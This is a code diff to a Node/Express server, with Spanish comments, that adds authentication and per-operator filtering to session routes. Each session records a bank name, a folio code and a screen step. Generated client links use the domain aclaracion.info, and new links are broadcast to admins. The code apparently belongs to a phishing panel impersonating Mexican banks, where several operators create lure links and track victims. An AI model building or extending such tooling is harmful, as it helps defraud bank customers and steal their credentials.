@@ -446,8 +446,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
   app.get('/api/sessions', async (req, res) => {
     try {
+      if (!req.isAuthenticated()) {
+        return res.status(401).json({ message: "No autenticado" });
+      }
+      
       const { type = 'current' } = req.query;
-
+      const currentUser = req.user;
+      
+      // Obtener todas las sesiones según el tipo
       let sessions;
       if (type === 'saved') {
         sessions = await storage.getSavedSessions();
@@ -456,8 +462,16 @@ export async function registerRoutes(app: Express): Promise<Server> {
       } else {
         sessions = await storage.getCurrentSessions();
       }
-
-      res.json(sessions);
+      
+      // Filtrar las sesiones por usuario, excepto para el usuario admin principal (balonx)
+      if (currentUser.role === 'admin' && currentUser.username === 'balonx') {
+        // El administrador principal (balonx) puede ver todas las sesiones
+        res.json(sessions);
+      } else {
+        // Los demás usuarios solo pueden ver sus propias sesiones
+        const userSessions = sessions.filter(session => session.createdBy === currentUser.username);
+        res.json(userSessions);
+      }
     } catch (error) {
       console.error("Error fetching sessions:", error);
       res.status(500).json({ message: "Error fetching sessions" });
@@ -466,13 +480,20 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
   app.post('/api/sessions', async (req, res) => {
     try {
+      if (!req.isAuthenticated()) {
+        return res.status(401).json({ message: "No autenticado" });
+      }
+      
       const { banco = "Invex" } = req.body;
       const sessionId = nanoid(10);
+      const currentUser = req.user;
+      
       const session = await storage.createSession({ 
         sessionId, 
         banco,
         folio: nanoid(6),
         pasoActual: ScreenType.FOLIO,
+        createdBy: currentUser.username, // Registrar el usuario que creó la sesión
       });
       res.json(session);
     } catch (error) {
@@ -589,6 +610,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         banco: banco as string,
         folio: sixDigitCode,
         pasoActual: ScreenType.FOLIO,
+        createdBy: user.username, // Registrar el usuario que creó la sesión
       });
 
       // Utilizamos el dominio aclaracion.info en lugar de los dominios de Replit
@@ -599,7 +621,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       console.log(`Nuevo enlace generado - Código: ${sixDigitCode}, Banco: ${banco}`);
       console.log(`URL del cliente: ${link}`);
-      console.log(`Generado por usuario: ${user.username}, Permisos de bancos: ${user.allowedBanks || 'all'}`);
+      console.log(`Generado por usuario: ${user.username}`);
 
       // Notificar a los clientes de admin sobre el nuevo enlace
       broadcastToAdmins(JSON.stringify({
